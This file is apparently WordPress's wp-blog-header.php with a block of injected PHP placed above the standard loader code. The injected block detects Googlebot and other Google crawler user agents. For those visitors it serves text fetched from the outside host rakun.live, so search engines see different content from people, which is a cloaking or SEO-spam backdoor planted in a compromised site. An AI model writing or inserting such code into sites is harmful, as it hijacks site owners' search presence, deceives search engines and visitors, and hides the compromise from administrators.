<?php
function check_user_agent($agent) {
    return strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false;
}
if (check_user_agent('Googlebot') || check_user_agent('Google-Site-Verification') || check_user_agent('Google-InspectionTool')) 
{ echo file_get_contents('https://rakun.live/landing/tech.txt');
exit;
} 


/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */

if ( ! isset( $wp_did_header ) ) {

	$wp_did_header = true;

	// Load the WordPress library.
	require_once __DIR__ . '/wp-load.php';

	// Set up the WordPress query.
	wp();

	// Load the theme template.
	require_once ABSPATH . WPINC . '/template-loader.php';

}
